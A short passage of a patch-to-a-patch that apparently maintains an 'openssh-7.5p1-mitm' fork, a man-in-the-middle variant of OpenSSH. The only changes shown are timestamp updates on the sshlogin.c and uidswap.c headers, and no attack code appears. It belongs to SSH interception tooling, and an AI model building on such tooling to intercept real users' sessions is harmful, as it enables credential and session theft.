 --- openssh-7.5p1/sshlogin.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/sshlogin.c	2017-07-14 16:03:47.628458469 -0400
++++ openssh-7.5p1-mitm/sshlogin.c	2017-07-18 11:33:02.569885185 -0400
 @@ -113,7 +113,8 @@
  		else
  			snprintf(buf, sizeof(buf), "Last login: %s from %s\r\n",
@@ -3066,7 +3097,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  #endif /* NO_SSH_LASTLOG */
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/uidswap.c openssh-7.5p1-mitm/uidswap.c
 --- openssh-7.5p1/uidswap.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/uidswap.c	2017-07-14 16:03:47.628458469 -0400
++++ openssh-7.5p1-mitm/uidswap.c	2017-07-18 11:33:02.569885185 -0400
 @@ -59,6 +59,8 @@
  void
  temporarily_use_uid(struct passwd *pw)
